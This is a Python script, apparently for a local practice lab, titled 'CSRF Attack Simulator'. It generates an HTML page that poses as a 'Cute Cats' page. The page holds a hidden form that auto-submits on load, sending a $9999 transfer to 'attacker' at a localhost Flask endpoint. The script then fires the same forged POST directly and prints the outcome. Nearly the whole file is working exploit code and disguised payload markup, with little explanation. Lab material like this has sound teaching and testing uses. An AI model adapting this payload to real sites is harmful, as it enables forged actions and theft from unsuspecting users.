import requests
from bs4 import BeautifulSoup

print("[+] CSRF Attack Simulator")

# Step 1: Generate a malicious HTML page that submits a form to the vulnerable endpoint
csrf_html = """
<!DOCTYPE html>
<html>
<head>
    <title>Cute Cats</title>
</head>
<body>
    <h1>Enjoy these cute cats!</h1>
    <img src="https://placekitten.com/200/300" alt="Cute cat">
    
    <!-- Hidden form that automatically submits -->
    <form id="csrf-form" action="http://localhost:5000/csrf" method="POST" style="display:none;">
        <input type="hidden" name="action" value="transfer">
        <input type="hidden" name="amount" value="9999">
        <input type="hidden" name="to" value="attacker">
    </form>
    
    <script>
        // Submit the form when page loads
        document.getElementById("csrf-form").submit();
    </script>
</body>
</html>
"""

# Save the malicious page
with open("csrf_attack.html", "w") as f:
    f.write(csrf_html)

print("1. Created malicious CSRF page 'csrf_attack.html'")
print("2. When a victim visits this page, it will automatically submit a form to transfer $9999")
print("3. In a real attack, this page would be hosted on an attacker's server")
print("4. To test manually, open the HTML file in a browser while the Flask app is running")

# Simulate the attack programmatically
print("\nSimulating the attack...")
r = requests.post("http://localhost:5000/csrf", data={
    "action": "transfer",
    "amount": "9999",
    "to": "attacker"
})

# Check the result
soup = BeautifulSoup(r.text, 'html.parser')
result = soup.find("p").text.strip()
print(f"Attack result: {result}")
